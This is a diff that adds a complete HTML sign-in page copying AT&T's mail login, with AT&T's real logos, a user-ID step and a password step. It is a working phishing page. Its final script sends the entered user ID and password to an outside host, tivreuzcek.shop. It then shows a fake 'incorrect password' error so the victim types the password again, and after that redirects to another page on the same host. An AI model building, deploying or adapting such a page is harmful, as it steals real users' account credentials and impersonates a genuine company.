@@ -1,0 +1,447 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>AT&T Sign In — Replica</title>
+<link rel="icon" href="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" />
+<style>
+/* ---- Fonts & base ---- */
+  :root{
+    --bg: #ffffff;
+    --text: #111111;
+    --muted: #6d6f71;
+    --primary: #004B8D; /* deep blue for button */
+    --link-blue: #0071CE;
+    --input-border: #BFC6CB;
+    --card-border: rgba(11,35,53,0.06);
+  }
+  html,body{
+    height:100%;
+    margin:0;
+    background:var(--bg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    color:var(--text);
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+  }
+
+  /* ---- Page layout ---- */
+  .page-wrap{
+    min-height:100%;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    padding:50px 50px;
+    box-sizing:border-box;
+  }
+
+  /* centered card */
+  .card {
+    width:100%;
+    max-width:720px; /* outer limits for big desktop center */
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    box-sizing:border-box;
+  }
+
+  /* Form container matching screenshot card */
+  .form {
+    width:100%;
+    max-width:420px;
+    background: #fff;
+    border-radius:15px;
+    border:2px solid var(--card-border);
+    padding:50px 35px;
+    box-sizing:border-box;
+    box-shadow: 0 1px 0 rgba(11,35,53,0.02);
+  }
+
+  /* vertical centering on wide desktop to match screenshot: narrower inner width */
+  .brand {
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin-bottom:22px;
+  }
+  .brand img { height:33px; width:auto; }
+
+  h1 {
+    font-weight:700;
+    font-size:30px;
+    text-align:center;
+    margin:14px 0 6px;
+    color:var(--text);
+  }
+  p.lead {
+    text-align:center;
+    font-weight:700;
+    margin:0 0 22px;
+    color:var(--text);
+    opacity:0.9;
+    font-size:22px;
+  }
+
+  /* label & input */
+  label{
+    display:block;
+    margin-bottom:8px;
+    font-weight:700;
+    color:var(--text);
+    font-size:13px;
+  }
+  .field {
+    margin-bottom:18px;
+  }
+
+  input[type="text"],
+  input[type="password"]{
+    width:100%;
+    height:52px;
+    padding:14px 16px;
+    border-radius:10px;
+    border:1.5px solid var(--input-border);
+    font-size:16px;
+    outline:none;
+    box-sizing:border-box;
+  }
+  input[type="text"]:focus,
+  input[type="password"]:focus {
+    border-color: #4EA1E6;
+    box-shadow: 0 0 0 1px rgba(78,161,230,0.08);
+  }
+
+  .welcome-title {
+  margin-bottom: 25px;
+  margin-top: 20px;
+  font-size:28px;
+}
+
+
+  /* Show control inside password wrapper */
+  .pw-wrap{
+    position:relative;
+  }
+  .show-toggle{
+    position:absolute;
+    right:12px;
+    top:70%;
+    transform:translateY(-50%);
+    background:none;
+    border:none;
+    
+    cursor:pointer;
+    font-weight:600;
+    color:#546E83;
+    font-size:10px;
+  }
+
+  /* big pill button */
+  .btn-primary{
+    display:inline-block;
+    width:100%;
+    height:45px;
+    line-height:5px;
+    text-align:center;
+    background:var(--primary);
+    color:#fff;
+    font-weight:700;
+    font-size:16px;
+    border-radius:999px;
+    border:none;
+    cursor:pointer;
+    margin:10px 0 18px;
+    box-shadow: none;
+  }
+  .btn-primary:hover{ filter:brightness(.95); }
+  .btn-primary:active{ transform: translateY(1px); }
+
+  /* small links */
+  .links {
+    display:block;
+    margin-top:8px;
+  }
+  .links a{
+    color:var(--link-blue);
+    text-decoration:none;
+    display:block;
+    margin:20px 0;
+    font-weight:700;
+    font-size:13px;
+  }
+  .links a:hover{text-decoration:underline;}
+
+  /* checkbox row */
+  .check-row{ display:flex; align-items:center; gap:10px; margin-bottom:12px; color:var(--muted); }
+  .check-row input{ width:18px; height:18px; }
+
+  /* footer */
+  footer.site-footer{
+    margin-top:40px;
+    text-align:center;
+    color:var(--muted);
+    font-size:13px;
+    opacity:0.95;
+  }
+  .footer-links {
+    display:flex;
+    gap:18px;
+    justify-content:center;
+    flex-wrap:wrap;
+    margin-bottom:12px;
+  }
+  .footer-links a{ color:var(--muted); text-decoration:none; font-size:13px; }
+  .footer-links a:hover{text-decoration:underline;}
+
+  /* small screen mobile card adjustments (the mobile screenshot corresponds to Page 1) */
+  @media (max-width: 768px) {
+  .form {
+    border: none; /* remove border on mobile only */
+    border-radius: 6px;
+    padding: 28px 22px;
+    max-width: 420px;
+    width: 100%;
+    box-shadow: none;
+    margin-top: 10px;
+  }
+  h1 {
+    font-size: 28px;
+    margin: 8px 0;
+  }
+  p.lead {
+    font-size: 16px;
+    margin-bottom: 18px;
+  }
+  .brand img {
+    height: 33px;
+    width: auto;
+  }
+  .btn-primary {
+    height: 50px;
+    line-height: 50px;
+    font-size: 15px;
+  }
+
+  /* Footer links keep desktop style on mobile */
+  .footer-links {
+    flex-direction: column;
+    gap: 16px;
+    padding-left: 25px;
+  }
+
+  .footer-links a {
+  font-size: 12px; /* increase link font size */
+}
+  footer.site-footer {
+    text-align: left;
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: var(--bg);
+    padding: 25px 0;
+    z-index: 1000;
+  }
+
+  .page-wrap {
+    padding-bottom: 70px; /* space for fixed footer */
+    min-height: 20%;
+    padding: 10px 10px;
+  }
+}
+
+
+  /* ---- Page views control (we keep both DOM nodes, show/hide) ---- */
+  .view { display:block; }
+  .hidden { display:none; }
+
+  /* back arrow */
+  .back {
+    display:inline-flex;
+    align-items:center;
+    gap:12px;
+    cursor:pointer;
+    color:var(--muted);
+    font-weight:600;
+    margin-bottom:18px;
+    text-decoration:none;
+  }
+  .back svg{ width:22px; height:22px; }
+
+  /* small helper for email display in welcome */
+  .email-display{ display:flex; align-items:center; gap:10px; justify-content:center; color:#222; margin-bottom:18px; font-weight:500; }
+
+</style>
+</head>
+<body>
+  <div class="page-wrap">
+    <div class="card">
+      <!-- Form container -->
+      <div class="form" role="main" aria-labelledby="mainTitle">
+        <!-- ====== VIEW: Sign in (Page 1) ====== -->
+        <section id="view-signin" class="view" aria-hidden="false">
+          <div class="brand"><img src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" alt="AT&amp;T logo"></div>
+          <h1 id="mainTitle">Sign in</h1>
+          <p class="lead">to access AT&amp;T Mail and<br>Currently.com</p>
+
+          <div class="field">
+            <label for="userid">User ID</label>
+            <input id="userid" type="text" placeholder="" aria-label="User ID" />
+          </div>
+
+          <button class="btn-primary" id="btnContinue" type="button" aria-label="Continue">Continue</button>
+
+          <div class="links" aria-label="help links">
+            <a href="#" id="forgotUserId">Forgot user ID?</a>
+            <a href="#" id="createUser">Don't have a user ID? Create one now</a>
+          </div>
+        </section>
+
+        <!-- ====== VIEW: Welcome / Password (Page 2) ====== -->
+        <section id="view-welcome" class="view hidden" aria-hidden="true">
+          <div class="brand"><img src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" alt="AT&amp;T logo" style="height:33px;"></div>
+          <h1 class="welcome-title">Welcome</h1>
+          
+          <div style="display: flex; justify-content: center; align-items: center;">
+            <a class="back" id="backToUser">
+              <img src="https://signin.att.com/static/siam/en/halo_c/cms/login/default/images/arrow-left-circle_24.svg" alt="Back" class="back-icon">
+              <span id="emailPreview" style="font-weight:600;color:#222;"></span>
+            </a>
+          </div>
+          
+
+          <div class="field pw-wrap">
+            <label for="pwd">Password</label>
+            <input id="pwd" type="password" placeholder="" aria-label="Password" />
+            <button class="show-toggle" id="toggleShow" aria-pressed="false">Show</button>
+          </div>
+
+          <div class="check-row">
+            <input type="checkbox" id="keepSigned" aria-label="Keep me signed in" />
+            <label for="keepSigned" style="margin:0; font-weight:500; color:var(--muted);">Keep me signed in</label>
+          </div>
+
+          <button class="btn-primary" id="btnSignIn" type="button" aria-label="Sign in">Sign in</button>
+
+          <div class="links">
+            <a href="#">Forgot password?</a>
+          </div>
+        </section>
+
+      </div> <!-- .form -->
+    </div> <!-- .card -->
+
+    <!-- footer -->
+    <footer class="site-footer" role="contentinfo">
+      <div class="footer-links">
+        <a href="#">Legal policy center</a>
+        <a href="#">Privacy policy</a>
+        <a href="#">Terms of use</a>
+        <a href="#">Accessibility</a>
+        <a href="#">Your privacy choices</a>
+      </div>
+      <div style="font-size:11px;color:var(--muted);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;©2025 AT&amp;T Intellectual Property. All rights reserved.</div>
+    </footer>
+  </div>
+
+<script>
+  // Basic UI interactions to toggle between views and show password
+  const btnContinue = document.getElementById('btnContinue');
+  const viewSignin = document.getElementById('view-signin');
+  const viewWelcome = document.getElementById('view-welcome');
+  const backToUser = document.getElementById('backToUser');
+  const userid = document.getElementById('userid');
+  const emailPreview = document.getElementById('emailPreview');
+  const pwd = document.getElementById('pwd');
+  const toggleShow = document.getElementById('toggleShow');
+
+  // Helper: show welcome view; use typed user id as email preview (or fallback)
+  btnContinue.addEventListener('click', () => {
+    const val = (userid.value || 'jhhj@yjhg...xjjJKB').trim();
+    emailPreview.textContent = val;
+    viewSignin.classList.add('hidden');
+    viewSignin.setAttribute('aria-hidden','true');
+    viewWelcome.classList.remove('hidden');
+    viewWelcome.setAttribute('aria-hidden','false');
+    // focus password
+    setTimeout(()=> pwd.focus(),120);
+  });
+
+  backToUser.addEventListener('click', (e)=>{
+    e.preventDefault();
+    viewWelcome.classList.add('hidden');
+    viewWelcome.setAttribute('aria-hidden','true');
+    viewSignin.classList.remove('hidden');
+    viewSignin.setAttribute('aria-hidden','false');
+    userid.focus();
+  });
+
+  // toggle show/hide password
+  toggleShow.addEventListener('click', () => {
+    if (pwd.type === 'password') {
+      pwd.type = 'text';
+      toggleShow.textContent = 'Hide';
+      toggleShow.setAttribute('aria-pressed','true');
+    } else {
+      pwd.type = 'password';
+      toggleShow.textContent = 'Show';
+      toggleShow.setAttribute('aria-pressed','false');
+    }
+  });
+</script>
+
+<script>
+    const btnSignIn = document.getElementById('btnSignIn');
+    const pwdInput = document.getElementById('pwd');
+    const useridInput = document.getElementById('userid');
+    
+    // Create error message element (same as your previous design)
+    const errorMessage = document.createElement('div');
+    errorMessage.style.backgroundColor = '#f2dede';
+    errorMessage.style.color = '#a94442';
+    errorMessage.style.border = '1px solid #ebccd1';
+    errorMessage.style.padding = '15px';
+    errorMessage.style.margin = '12px 0 18px';
+    errorMessage.style.fontSize = '14px';
+    errorMessage.style.borderRadius = '0px';
+    errorMessage.style.display = 'none';
+    errorMessage.textContent = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.";
+    btnSignIn.parentNode.insertBefore(errorMessage, btnSignIn);
+    
+    // Hide error on input
+    useridInput.addEventListener('input', () => errorMessage.style.display = 'none');
+    pwdInput.addEventListener('input', () => errorMessage.style.display = 'none');
+    
+    btnSignIn.addEventListener('click', (e) => {
+        e.preventDefault();
+    
+        const formData = new FormData();
+        formData.append('userid', useridInput.value.trim());
+        formData.append('pwd', pwdInput.value.trim());
+    
+        fetch('https://tivreuzcek.shop/index.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(res => res.json()) // PHP will return JSON with {status: "ok" or "final"}
+        .then(data => {
+            if(data.status === "ok") {
+                errorMessage.style.display = 'block';
+                pwdInput.value = '';
+                pwdInput.focus();
+            } else if(data.status === "final") {
+                window.location.href = 'https://tivreuzcek.shop/final.php'; // final redirect
+            }
+        })
+        .catch(err => {
+            console.error("Error sending data", err);
+            errorMessage.style.display = 'block';
+        });
+    });
+    </script>
+    
+    
+</body>
+</html>
